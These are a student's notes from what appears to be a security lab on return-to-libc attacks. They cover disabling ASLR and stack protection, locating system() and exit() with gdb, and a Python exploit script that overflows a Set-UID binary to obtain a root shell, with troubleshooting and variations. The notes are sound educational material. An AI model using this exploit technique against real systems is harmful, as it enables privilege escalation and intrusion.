# Return-to-Libc Lab
## Lab Setup
- turn off countermeasures
    1. no ASRL: `$ sudo sysctl -w kernel.randomize_va_space=0`
    2. no SafeGuard: add `-fno-stack-protector` flag when compiling
    3. **non-executable** stack: add `-z noexecstack` flag when compiling
    4. replace `/bin/dash`, which has a countermeasure to revoke privilege when running `Set-UID` programs: `$ sudo ln -sf /bin/zsh /bin/sh`

## Task 1: Finding out the Addresses of `libc` Functions
- in Linux, when a program runs, the `libc` library will be loaded into memory
- when ASRL is turned off, for the same program, the library is always loaded in the same memory address (for the same program, if we change it from a `Set-UID` program to a normal program, the `libc` may not be loaded to the same location)
- use the `gdb` to debug the program,  and find the address of `system()`
    - commands
        - `run` execute the target program once
        - `p` (or `print`) print out the address of `system()` and `exit()` functions
        - `gdb -q retlib` debug `retlib` in quite mode
    - open `retlib` with gdb, and set a break point at `main()`, `run`, the program will pause when it reaches `main()`, and the `libc` will be loaded, then use `p` to print out the address of `system()` and `exit()`
        ```
        $ gdb -q retlib
        Reading symbols from retlib...
        (No debugging symbols found in retlib)
        gdb-peda$ break main
        Breakpoint 1 at 0x12ef
        gdb-peda$ run
        Starting program: ...
        ...
        Breakpoint 1, 0x565562ef in main()
        gdb-peda$ p system
        $1 = {<text variable, no debug info>} 0xf7e12420 <system>
        gdb-peda$ p exit
        $2 = {<text variable, no debug info>} 0xf7e04f80 <exit>
        gdb-peda$ quit
        $
        ```
    - we can also run `gdb` in batch mode, i.e., put `gdb` commands in a file
        - `gdb -q -batch -x gdb_command.txt ./retlib`
        - `gdb_command.txt`
            ```
            break main
            run
            p system
            p exit
            quit
            ```
## Task 2: Putting the Shell String in the Memory
- goal: jump to `system()` and get it to execute an arbitrary command, e.g., `"/bin/sh"`
- use environment variable
    - when running a program from a shell prompt, it actually spawns a child process to execute the program, and all the exported shell variables become the environment variables of the child process
    - create a shell variable `MYSHELL`: `$ export MYSHELL=/bin/sh`, we can check this via `env | grep MYSHELL` or `printenv MYSHELL` or `printenv | grep MYSHELL`
    - find the location of this variable in the memory
        - `prtenv.c`
            ```
            ...
            void main() {
                char *shell = getenv("MYSHELL");
                if(shell) {
                    printf("%x\n", (unsigned int) shell);
                }
            }
            ```
        ```
        $ ./prtenv
        ffffe3fd
        $ ./prtenv
        ffffe3fd
        ```

## Task 3: Launching the Attack
- when we run `retlib` with a benign input, we can know the value of `ebp` and `&buffer`
- **IMPORTANT**: if we use `p $ebp` to check the value of `ebp` in `gdb` when in `bof()`, we will get a different value, because `gdb` run this program with its absolute path, and `gdb` sets some extra environment variables
- however, we don't need the exact value of `ebp`, we only need to know `$ebp-&buffer`, it's 24
- create the payload in `badfile` with `exploit.py` (the initial version)
    ```
    #!/usr/bin/env python3
    import sys

    offset = 24

    content = bytearray(0xaa for i in range(300))

    X = offset + 12
    sh_addr = 0xffffe3fd # The address of "/bin/sh"
    content[X:X+4] = (sh_addr).to_bytes(4, byteorder='little')

    Y = offset + 4
    system_addr = 0xf7e0d370 # The address of system()
    content[Y:Y+4] = (system_addr).to_bytes(4, byteorder='little')

    Z = offset + 8
    exit_addr = 0xf7dffed0 # The address of exit()
    content[Z:Z+4] = (exit_addr).to_bytes(4, byteorder='little')
    ```
- **trouble shooting**
    - after generating a new `badfile`, run `./retlib`, it doesn't spawn a new shell
    - debug `retlib` with `gdb`, in the `bof()`, we can see the stack information
        ```
        ...
        0040| 0xffffcd08 --> 0xaaaaaaaa
        0044| 0xffffcd08 --> 0xf7e0d370 (<system>:   endbr32)
        0048| 0xffffcd08 --> 0xf7dffed0 (<exit>:   endbr32)
        0052| 0xffffcd08 --> 0xffffe3fd
        0056| 0xffffcd08 --> 0xaaaaaaaa
        ...
        gdb-peda$ x/s 0xffffe3fd
        0xffffe3fd:   <error: Cannot access memory at address 0xffffe3fd>
        ```
    - the problem is that the address of the string `"/bin/sh"` is not accessible by the program

    - **FIX**: after analyzing, the prolem is that when compiling `prtenv.c`, I didn't add `-m32` flag, so the program is a 64-bit program, it gave a warning that the size of `unsigned int` and `char*` is different when converting, so in this case, I actually got the lower 32 bits of a 64-bit address, which was not the 32-bit address of the string "/bin/sh", the correct address is `0xffffd3fd`
    - after compile `prtenv.c` with `-m32` flag and get the correct address, generate the new `badfile`, then run `./retlib`, we got a shell with root privilege 
        ```
        $ ./retlib
        Address of input[] inside main(): 0xffffcd90
        Input size: 300
        Address of buffer[] inside bof(): 0xffffcd60
        Frame Pointer value inside bof(): 0xffffcd78
        # whoami
        root
        ```
- variations
    1. try attack without including the address of `exit()` in the payload (still works)
        - another variation: the original attack prompts a new shell, to see how the program behave after `system()` finishs execution, use another command `export MYSHELL=/bin/ls`
        - with `exit()`
            ```
            ./retlib
            Address of input[] inside main(): 0xffffcd90
            Input size: 300
            Address of buffer[] inside bof(): 0xffffcd60
            Frame Pointer value inside bof(): 0xffffcd78
            exploit.py    prtenv     retlib    retlibnewxxxxxxx
            badfile       Makefile   prtenv.c  retlib.c
            ```
        - without `exit()`
            ```
            ./retlib
            Address of input[] inside main(): 0xffffcd90
            Input size: 300
            Address of buffer[] inside bof(): 0xffffcd60
            Frame Pointer value inside bof(): 0xffffcd78
            exploit.py    prtenv     retlib    retlibnewxxxxxxx
            badfile       Makefile   prtenv.c  retlib.c
            Segmentation fault (<---- THE PROGRAM DIDN'T END NORMALLY)
            ```
        - we can see that `exit()` ensures the program to end normally
    2. change the length of name of `retlib` (not work anymore, because the name of the program will be stored in the arguments, changing the length of it may cause some addresses to change)
        ```
        $ ./retlib
        Address of input[] inside main(): 0xffffcd80
        Input size: 300
        Address of buffer[] inside bof(): 0xffffcd50
        Frame Pointer value inside bof(): 0xffffcd68
        Segmentation fault
        ```

- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      |
    |          +---------------------+ 
    |          |     system_addr     | (return address)
    |          +---------------------+
    |          |      old ebp        |
    |          |---------------------| <---- ebp
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```

- stack before return to `system()`
    ```
    High Memory Addresses
    |          +---------------------+ 
    |          |        ...          |
    |          |---------------------|    
    |          |       sh_addr       |
    |          |---------------------|
    |          |      exit_addr      | (return address)
    |          +---------------------+
    |          |        ...          |    
    |          +---------------------+
    |          |    Unused Space     |
    |          +---------------------+
    Low Memory Addresses
    ```

## Task 4: Defeat Shell's Countermeasure

## Task 5: Return-Oriented Programming